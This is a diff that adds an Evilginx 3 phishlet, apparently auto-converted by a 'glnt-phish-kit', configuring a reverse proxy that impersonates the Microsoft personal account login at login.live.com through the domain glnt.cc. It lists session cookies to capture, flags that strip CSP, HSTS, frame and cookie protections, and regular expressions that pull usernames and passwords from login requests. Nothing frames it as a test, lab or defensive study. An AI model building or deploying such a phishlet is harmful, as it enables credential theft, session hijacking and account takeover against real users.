@@ -1,0 +1,49 @@
+# =============================================================================
+# Evilginx 3 Phishlet — converted from microsoft-personal.json
+# =============================================================================
+#
+# IMPORTANT: This is an automated conversion. Operator MUST review before use.
+#
+# Session cookies (Evilginx auto-detects these; listed for operator reference):
+#   - MSPAuth
+#   - MSPRequ
+#   - MSPOK
+#   - ESTSAUTH
+#   - ESTSAUTHPERSISTENT
+#   - ESTSAUTHLIGHT
+#   - SignInStateCookie
+#
+# JSON rewrite flags active: strip_csp, strip_xfo, strip_hsts, strip_cookie_secure, strip_cookie_domain, rewrite_location
+# Evilginx auto_filter handles some of these; verify after deployment.
+#
+# Additional upstream hosts (not auto-converted — add as extra proxy_hosts entries):
+#   - phish_sub: login  orig_sub: login  domain: microsoftonline.com  (from https://login.microsoftonline.com)
+#
+
+name: microsoft-personal
+author: "glnt-phish-kit"
+min_ver: "3.0.0"
+proxy_hosts:
+  - phish_sub: login
+    orig_sub: login
+    domain: live.com
+    session: true
+    is_landing: true
+    auto_filter: true
+sub_filters:
+  - hostname: login.glnt.cc
+    sub: login
+    domain: glnt.cc
+    replace:
+      from: login.glnt.cc
+      to: login.live.com
+auth_urls:
+  - https://login.live.com/
+  - https://login.live.com/oauth20_authorize.srf
+  - https://login.live.com/ppsecure/
+  - https://login.live.com/login.srf
+landing_path: "/"
+user_re: "(?:loginfmt|login|email|username)=([^&]+)"
+pass_re: "(?:passwd|password|Password|secret)=([^&]+)"
+force_post: false
+is_mfa: false
